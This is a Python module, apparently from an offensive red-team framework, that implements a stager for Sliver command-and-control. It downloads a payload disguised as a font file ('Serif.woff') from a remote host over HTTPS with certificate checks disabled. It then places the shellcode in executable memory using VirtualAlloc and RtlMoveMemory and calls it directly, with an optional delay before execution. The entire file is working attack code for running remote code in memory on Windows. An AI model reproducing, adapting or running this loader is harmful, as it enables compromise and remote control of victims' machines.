#import utils.arg
from utils.helper import nstate as nstate
from utils.helper import CheckFile, GetFileHash
from time import sleep
import ctypes.wintypes
#import sys
#import argparse
#import socket
import requests
#import struct
import ctypes

CATEGORY = 'stager'

def register_arguments(parser):
        parser.add_argument('-p', '--port', default=4444, type=int, required=True, help='Remote port to connect to')
        parser.add_argument('-r', '--remote-host', type=str, required=True, help='Remote host to connect to e.g. 192.168.2.1')
        parser.add_argument('-s', '--sleep', default=0, type=int, required=True, help='Sleep for x seconds before the stage is executed')

class stage():
    
    Author = 'psycore8'
    Description = 'Connect to a Sliver HTTPS listener, download stage and execute'
    Version = '1.1.0'
    DisplayName = 'SLIVER-STAGER'
    payload_size = 0
    sbuffer = bytearray
    requests.packages.urllib3.disable_warnings() 
    MEM_COMMIT_RESERVE = 0x00003000
    PAGE_READWRITE_EXECUTE = 0x00000040
    kernel32 = ctypes.windll.kernel32
    VirtualAlloc = kernel32.VirtualAlloc
    VirtualAlloc.argtypes = [ctypes.wintypes.LPVOID, ctypes.c_size_t, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]
    VirtualAlloc.restype = ctypes.wintypes.LPVOID
    RtlMoveMemory = kernel32.RtlMoveMemory
    RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
    RtlMoveMemory.restype = None
    CreateThread = kernel32.CreateThread
    CreateThread.argtypes = [ctypes.c_int, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.wintypes.DWORD, ctypes.c_int]
    CreateThread.restype = None
    WaitForSingleObject = kernel32.WaitForSingleObject
    WaitForSingleObject.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD]
    WaitForSingleObject.restype = None

    def msg(self, message_type, ErrorExit=False):
        messages = {
            'pre.head'      : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'proc.sock'     : f'{nstate.s_note} Creating Socket...',
            'proc.con'      : f'{nstate.s_ok} Connection established',
            'proc.stage'    : f'{nstate.s_note} Download stage...',
            'proc.url'      : f'{nstate.s_note} Stage URL: https://{self.remote_host}:{self.remote_port}/Serif.woff',
            #'proc.size'     : f'{nstate.s_note} Payload size: {self.payload_size} bytes',
            'proc.stage_ok' : f'{nstate.s_ok} Stage downloaded! Size: {self.payload_size} bytes',
            'proc.exec'     : f'{nstate.s_note} Trying to execute Meterpreter stage...',
            'proc.pos'      : f'{nstate.s_note} Trying to find payload position...',
            'proc.buf'      : f'{nstate.s_ok} Payload found, printing the first 8 bytes: {self.sbuffer}',
            'inj.alloc'     : f'{nstate.s_ok} Memory allocated!',
            'inj.sleep'     : f'{nstate.s_info} Let\'s take a nap for {self.sleeptime} seconds',
            'inj.exec'      : f'{nstate.s_note} Execute payload...',
            'inj.ok'        : f'{nstate.s_ok} Buffer prepared!',
            'inj.fail'      : f'{nstate.s_fail} Payload not executed',
            'post.done'     : f'{nstate.s_ok} DONE!',
            'error.alloc'   : f'{nstate.s_fail} Error allocating memory',
            'error.con'     : f'{nstate.s_fail} Connevtion failed',
            'error.stage_ok': f'{nstate.s_fail} Error during download',
            'error.buf'     : f'{nstate.s_fail} Buffer not valid'
        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def __init__(self, remote_host=str, remote_port=int, sleeptime=int):
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.sleeptime = sleeptime


    def process(self):
        self.msg('pre.head')
        static_url = f'https://{self.remote_host}:{self.remote_port}/Serif.woff'
        try:
            self.msg('proc.stage')
            response = requests.get(static_url, stream=True, verify=False)
            response.raise_for_status()
            stage_data = response.content
            self.msg('proc.url')
            self.msg('proc.stage_ok')
        except requests.exceptions.RequestException as e:
            self.msg('error.stage_ok')
        stage_start = stage_data.find(b'\x00')
        stage_buffer = bytearray(stage_data[stage_start + 1:])
        self.sbuffer = stage_buffer[0:8]
        self.msg('proc.buf')
        #print(f'{nstate.OKGREEN} Payload found, printing the first 8 bytes: {stage_buffer[0:8]}')
        #print(f'{nstate.INFO} Stage length: {len(stage_buffer)}')
        ptr = self.VirtualAlloc(0, len(stage_buffer), self.MEM_COMMIT_RESERVE, self.PAGE_READWRITE_EXECUTE)
        if ptr:
             self.msg('inj.alloc')
             #print(f'{nstate.OKGREEN} Memory allocated!')
        else:
             self.msg('error.alloc', True)
             #print(f'{nstate.FAIL} Memory not allocated!')
        buf = (ctypes.c_char * len(stage_buffer)).from_buffer(stage_buffer)
        if buf:
            self.msg('inj.ok')
            #print(f'{nstate.OKGREEN} Buffer prepared!')
            self.RtlMoveMemory(ptr, buf, len(stage_buffer))
            if self.sleeptime > 0:
                self.msg('inj.sleep')
            #print(f'{nstate.INFO} Let\'s take a nap for {self.sleeptime} seconds')
                sleep(self.sleeptime)
            ptr_f = ctypes.cast(ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))
            ptr_f()
            #ht = self.CreateThread(0, 0, ptr, 0, 0, ctypes.c_int(0))
            # if ht:
            #      print('Thread created')
            # else:
            #      print('Error')
            #self.WaitForSingleObject(ht, 1)
        else:
            self.msg('error.buf', True)
            #print(f'{nstate.FAIL} Buffer not valid!')

    